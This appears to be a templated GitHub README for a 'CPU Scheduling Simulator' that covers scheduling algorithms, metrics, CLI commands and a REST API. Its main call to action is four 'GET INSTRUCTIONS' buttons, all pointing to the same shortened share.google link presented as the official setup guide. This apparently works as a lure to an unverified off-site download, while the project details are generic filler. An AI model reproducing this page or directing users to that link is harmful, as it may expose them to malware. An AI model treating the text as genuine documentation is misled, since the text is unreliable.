# 🌐 CPU Scheduling Simulator — Complete Guide

<div align="center">

![CPU Scheduling](https://img.shields.io/badge/CPU-Scheduling%20Simulator-B91C1C?style=for-the-badge&logo=intel&logoColor=white)
![Algorithms](https://img.shields.io/badge/Algorithms-12%2B-7C3AED?style=for-the-badge&logo=thealgorithms&logoColor=white)
![Visualization](https://img.shields.io/badge/Visualization-Gantt%20Charts-0891B2?style=for-the-badge&logo=chartdotjs&logoColor=white)
![Guides](https://img.shields.io/badge/Guides-95K-16A34A?style=for-the-badge&logo=readthedocs&logoColor=white)

### 🧮 Interactive Simulator for Operating System Scheduling Algorithms

*A complete guide to visualizing FCFS, SJF, Round Robin, and more*

</div>

<div align="center">

<img width="1280" height="720" alt="maxresdefault (74)" src="https://github.com/user-attachments/assets/7d044cc7-d9dc-4108-8a8d-c5d987050980" />

</div>

---

## 🧭 Structure Overview

> **🧩 Documentation layout**

```
┌─────────────────────────────────────────────────┐
│     CPU SCHEDULING SIMULATOR — GUIDE MAP        │
├─────────────────────────────────────────────────┤
│                                                 │
│   01 ─ FOUNDATION                               │
│        Overview · Why Simulate · Concepts       │
│                                                 │
│   02 ─ SETUP                                    │
│        Requirements · Get Instructions          │
│                                                 │
│   03 ─ ALGORITHMS                               │
│        FCFS · SJF · RR · Priority · MLFQ        │
│                                                 │
│   04 ─ SIMULATION                               │
│        Input · Run · Analyze · Compare          │
│                                                 │
│   05 ─ ADVANCED                                 │
│        Custom · Metrics · Export                │
│                                                 │
│   06 ─ SUPPORT                                  │
│        Troubleshooting · FAQ · Resources        │
└─────────────────────────────────────────────────┘
```

---

## 🎯 Overview

**CPU Scheduling Simulator** is an educational and research tool that visualizes how operating systems decide which process runs next. It implements the classic scheduling algorithms taught in OS courses — and lets you watch them compete in real time with **Gantt charts**, **metrics tables**, and **side-by-side comparisons**.

Whether you're a student preparing for an exam, a teacher explaining OS concepts, or an engineer validating a custom policy, this simulator turns abstract theory into tangible, visual results.

### 🧠 Why Simulate?

| Reason | Benefit |
|--------|---------|
| 📚 **Learning** | See algorithms in action |
| 🔬 **Research** | Test custom policies |
| 🎓 **Teaching** | Visual demonstrations |
| 📊 **Comparing** | Side-by-side metrics |
| 🐛 **Debugging** | Trace scheduling logic |
| ⚡ **Tuning** | Optimize parameters |

---

## 🧬 Core Concepts

| Term | Meaning |
|------|---------|
| 🧩 **Process** | Program requiring CPU time |
| ⏱️ **Burst Time** | CPU time needed |
| 🕐 **Arrival Time** | When process enters ready queue |
| 🎯 **Priority** | Importance ranking |
| ⏳ **Waiting Time** | Time spent in queue |
| 🔄 **Turnaround** | Completion − arrival |
| 📊 **Throughput** | Processes per unit time |
| 🧠 **Context Switch** | Overhead of switching |

---

## 🖥️ System Requirements

### 🔹 Minimum

```
✅ OS: Windows 10, macOS 11+, Ubuntu 20.04+
✅ CPU: Dual-core 2.0 GHz
✅ RAM: 4 GB
✅ Storage: 300 MB
✅ Runtime: Python 3.10+ or Node.js 18+
✅ Browser: Chrome 90+ / Firefox 88+
✅ Display: 1280×720
```

### 🔸 Recommended

```
⭐ OS: Windows 11 / macOS 13+ / Ubuntu 22.04+
⭐ CPU: Quad-core 2.5 GHz+
⭐ RAM: 8 GB
⭐ Storage: 1 GB SSD
⭐ Runtime: Python 3.11+ / Node.js 20 LTS
⭐ Display: 1920×1080+
⭐ GPU: For smooth animations
```

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-B91C1C?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=7F1D1D)](https://share.google/X0AeSBLIDkOgRloDN)

</div>

---

## 📘 Get Instructions

<div align="center">

### 🚀 Access the Official Setup Guide

Click below to reach the instructions portal:

<br>

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-7C3AED?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=4C1D95)](https://share.google/X0AeSBLIDkOgRloDN)

<br>

*Open Source • Educational • Cross-Platform*

</div>

### 📚 Available Guides

| Guide | Purpose |
|-------|---------|
| 📘 **Setup Guide** | Install and run |
| 📗 **Algorithm Reference** | All schedulers |
| 📙 **Metrics Guide** | Understanding KPIs |
| 📕 **Custom Schedulers** | Write your own |
| 📓 **Classroom Kit** | Teaching materials |

---

## ⚙️ Installation Workflow

### 🪜 Stage 1 — Access the Instructions

Open the official setup guide from the button above.

### 🪜 Stage 2 — Choose Install Method

**Python:**

```bash
pip install cpu-scheduling-sim
```

**Node.js:**

```bash
npm install -g cpu-scheduling-sim
```

**Docker:**

```bash
docker pull cpuss/simulator:latest
docker run -p 8080:8080 cpuss/simulator
```

### 🪜 Stage 3 — Verify Install

```bash
cpuss --version
```

Expected: `cpu-scheduling-sim v2.x.x`

### 🪜 Stage 4 — Launch Interface

```bash
cpuss start --port 8080
```

Open **http://localhost:8080**.

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-0891B2?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0C4A6E)](https://share.google/X0AeSBLIDkOgRloDN)

</div>

### 🪜 Stage 5 — Load Sample Data

Click **Load Sample** to populate the process table.

### 🪜 Stage 6 — Run Your First Simulation

Select **FCFS** → Click **Run**.

### 🪜 Stage 7 — Explore Other Algorithms

Try SJF, RR, Priority, and MLFQ.

### 🪜 Stage 8 — Save Configuration

**File → Save Scenario** to reuse later.

---

## 🧮 Algorithms

### 📋 Supported Schedulers

| Algorithm | Type | Preemptive |
|-----------|:----:|:----------:|
| 🎯 **FCFS** | First-Come First-Served | ❌ |
| 🎯 **SJF** | Shortest Job First | ❌ |
| 🎯 **SRTF** | Shortest Remaining Time | ✅ |
| 🔄 **Round Robin** | Time-sliced | ✅ |
| 🏆 **Priority** | Priority-based | ❌ |
| 🏆 **Preemptive Priority** | Priority + preempt | ✅ |
| 📚 **MLFQ** | Multi-Level Feedback Queue | ✅ |
| 📊 **HRRN** | Highest Response Ratio | ❌ |
| 🎲 **Lottery** | Randomized | ✅ |
| 💰 **CFS** | Completely Fair | ✅ |
| ⏱️ **EDF** | Earliest Deadline First | ✅ |
| 🧠 **AI-Adaptive** | Heuristic-based | ✅ |

### 🔍 Quick Comparisons

| Algorithm | Best For | Worst For |
|-----------|----------|-----------|
| FCFS | Simplicity | Long jobs block short |
| SJF | Minimum wait time | Starvation |
| RR | Fairness | Context overhead |
| Priority | Importance | Starvation |
| MLFQ | Mixed workloads | Complexity |

---

## 🖥️ Simulation Workflow

### 🪜 Step 1 — Define Processes

| Field | Example | Meaning |
|-------|---------|---------|
| PID | P1 | Process ID |
| Arrival | 0 | When it enters |
| Burst | 5 | CPU time |
| Priority | 3 | Higher = more important |

### 🪜 Step 2 — Choose Algorithm

Select from dropdown or load a custom scheduler.

### 🪜 Step 3 — Set Time Quantum (RR)

Only for preemptive schedulers. Default: 4 ms.

### 🪜 Step 4 — Run Simulation

Click **Run** to animate the Gantt chart.

### 🪜 Step 5 — Inspect Metrics

| Metric | Formula |
|--------|---------|
| ⏳ Waiting Time | Turnaround − Burst |
| 🔄 Turnaround | Completion − Arrival |
| 📊 Response Time | First CPU − Arrival |
| 📈 CPU Util | Busy / Total |
| 📉 Throughput | Processes / Time |

### 🪜 Step 6 — Compare Algorithms

Select multiple algorithms → **Compare** to view side-by-side results.

---

## 📊 Metrics & Visualization

### 📈 Gantt Chart

Shows which process runs when — color-coded per PID.

### 📉 Bar Charts

Waiting time, turnaround, and response time per process.

### 📊 Comparison Table

| Algorithm | Avg Wait | Avg Turnaround | CPU Util |
|-----------|:--------:|:--------------:|:--------:|
| FCFS | 8.2 ms | 12.4 ms | 92% |
| SJF | 5.1 ms | 9.3 ms | 95% |
| RR (4ms) | 6.8 ms | 11.0 ms | 90% |
| Priority | 7.4 ms | 11.6 ms | 93% |

### 🎬 Animation Controls

| Control | Function |
|---------|----------|
| ▶️ Play | Start animation |
| ⏸️ Pause | Freeze mid-run |
| ⏩ Speed | 1×–16× |
| 🔄 Reset | Restart |
| ⏭️ Step | One tick at a time |

---

## 🧪 Advanced Usage

### 🛠️ Custom Schedulers

Write your own in Python:

```python
from cpuss import Scheduler, Process

class MyScheduler(Scheduler):
    def pick_next(self, ready_queue):
        # Pick highest priority, tie-break by shortest burst
        return min(ready_queue, key=lambda p: (-p.priority, p.burst))

register_scheduler("my-policy", MyScheduler)
```

### 📤 Export Results

```bash
cpuss export --format csv --output results.csv
cpuss export --format json --output results.json
cpuss export --format pdf --output report.pdf
```

### 🔌 Batch Simulations

```bash
cpuss batch --scenarios ./scenarios/ --output ./results/
```

### 🌐 REST API

```bash
curl -X POST http://localhost:8080/api/simulate \
  -H "Content-Type: application/json" \
  -d '{
    "algorithm": "sjf",
    "processes": [
      {"pid":"P1","arrival":0,"burst":5},
      {"pid":"P2","arrival":1,"burst":3}
    ]
  }'
```

---

## 🧪 Verification

| Check | Command | Expected |
|-------|---------|----------|
| ✅ Install | `cpuss --version` | Version shown |
| ✅ Launch | `cpuss start` | UI opens |
| ✅ Sample runs | Click Run | Gantt renders |
| ✅ Compare works | Multi-select | Table shown |
| ✅ Export works | `cpuss export` | File created |
| ✅ API responds | curl test | JSON result |
| ✅ Custom scheduler | Register | Listed |
| ✅ No crashes | Full session | Stable |

---

## 🩺 Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| 🚫 UI won't load | Port in use | Change port |
| 🚫 Animations stutter | Weak GPU | Lower FPS |
| 🚫 Wrong metrics | Bad input | Verify data |
| 🚫 Algorithm missing | Old version | Update |
| 🚫 Custom scheduler fails | Syntax | Check traceback |
| 🚫 Export empty | No simulation | Run first |
| 🚫 API 404 | Wrong endpoint | Check docs |
| 🚫 Batch hangs | Huge dataset | Split scenarios |
| 🚫 Round Robin stalls | Quantum = 0 | Set > 0 |
| 🚫 Compare mismatched | Different inputs | Use same data |

### 🔄 Reset Everything

```bash
cpuss reset --all
```

---

## 🧰 CLI Reference

| Command | Purpose |
|---------|---------|
| `cpuss start` | Launch web UI |
| `cpuss run <algo>` | Run simulation |
| `cpuss batch` | Batch scenarios |
| `cpuss export` | Export results |
| `cpuss import` | Load scenario |
| `cpuss compare` | Multi-algorithm |
| `cpuss scheduler list` | List algorithms |
| `cpuss scheduler register` | Add custom |
| `cpuss reset` | Reset state |
| `cpuss --help` | Show help |

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **Official Docs** | Full reference |
| 🎓 **Course Slides** | Teaching material |
| 💬 **Discord** | Community help |
| 🐛 **GitHub Issues** | Bug reports |
| 📚 **Textbook Companion** | OS theory |

---

## 💬 FAQ

**Is it free?**
Yes — MIT-licensed, open source.

**Can I add my own algorithm?**
Yes — via the plugin API.

**Does it work offline?**
Yes — everything runs locally.

**Can I save scenarios?**
Yes — export/import JSON.

**Does it support Gantt exports?**
Yes — as PNG, SVG, or PDF.

**Can I use it for teaching?**
Yes — classroom kit included.

**Does it handle hundreds of processes?**
Yes — tested with 500+.

**Is there a mobile version?**
The web UI is responsive.

**Can I compare multiple algorithms?**
Yes — up to 4 side-by-side.

**Does it include context-switch overhead?**
Yes — configurable.

---

## 📅 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **2.3.0** | Jan 2025 | AI-Adaptive scheduler |
| 2.1.0 | Oct 2024 | PDF reports |
| 2.0.0 | Jun 2024 | New visualization |
| 1.5.0 | Feb 2024 | Custom schedulers |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-16A34A?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=14532D)](https://share.google/X0AeSBLIDkOgRloDN)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the OS community*

</div>
